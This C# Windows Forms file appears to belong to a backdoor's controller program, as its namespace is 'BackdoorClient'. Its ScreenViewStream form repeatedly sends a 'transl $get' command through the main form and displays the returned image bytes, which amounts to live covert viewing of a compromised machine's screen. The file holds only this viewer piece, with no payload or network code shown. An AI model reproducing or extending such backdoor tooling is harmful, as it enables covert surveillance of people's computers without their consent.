using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Xml;

namespace BackdoorClient
{
    public partial class ScreenViewStream : Form
    {
        public Form1 mainForm;
        public Thread UpdateScreenThread;

        public ScreenViewStream(Form1 f)
        {
            mainForm = f;
            InitializeComponent();
        }
        protected override void OnFormClosed(FormClosedEventArgs e)
        {
   
            //base.OnFormClosing(e);
            UpdateScreenThread.Abort();
        }

        private void ScreenViewStream_Load(object sender, EventArgs e)
        {
            UpdateScreenThread = new Thread(() => UpdateScreen());
            //UpdateScreen();
            UpdateScreenThread.Start();
        }

        private void UpdateScreen()
        {
            System.Threading.Thread.Sleep(1000);
            while (true)
            {
                var pictrBytes = new byte[100000];

                pictrBytes = mainForm.SendCommandAndGetBytesResponce("transl $get", 1000000);
                Bitmap bmp;
                try
                {
                    using (var ms = new MemoryStream(pictrBytes))
                    {
                        bmp = new Bitmap(ms);
                    }


                    translScreen.Image = bmp;
         
                }
                catch
                {

                }
                translScreen.Invoke(new Action(translScreen.Update));
                System.Threading.Thread.Sleep(100);
            }
        }

        private void translScreen_Click(object sender, EventArgs e)
        {

        }
    }
}
